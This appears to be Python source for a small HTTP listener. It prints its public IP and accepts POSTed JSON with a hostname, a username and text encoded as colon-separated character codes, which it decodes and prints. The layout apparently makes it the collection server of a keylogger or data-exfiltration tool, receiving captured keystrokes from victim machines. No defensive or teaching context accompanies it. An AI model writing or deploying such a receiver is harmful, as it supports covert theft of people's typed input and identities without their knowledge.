import requests
import http.server
import io
import json
import os


class POSTHandler(http.server.BaseHTTPRequestHandler):
    def do_POST(self):
        content_length = int(self.headers['Content-Length'])
        body = self.rfile.read(content_length)
        self.send_response(200)
        self.end_headers()
        response = io.BytesIO()

        response.write(body)
        self.wfile.write(response.getvalue())

        res_json = json.loads(body.decode('utf-8'))

        hostname = res_json['hostname']
        username = res_json['username']
        orig_text = res_json['text'].split(':')

        text = [chr(int(orig_text[i])) if orig_text[i] != '' else '' for i in range(len(orig_text))]

        text = [text[i] if text[i] != '' else '' for i in range(len(text))]

        print(hostname, username, ''.join(text))


def run(server_class=http.server.HTTPServer, handler_class=http.server.BaseHTTPRequestHandler):
    IP = requests.get('https://api.ipify.org').text

    PORT = int(os.environ.get("PORT", 33507))

    print((IP, PORT))

    server_address = ('0.0.0.0', 33507)

    httpd = server_class(server_address, handler_class)
    httpd.serve_forever()


def main():
    run(handler_class=POSTHandler)


if __name__ == '__main__':
    main()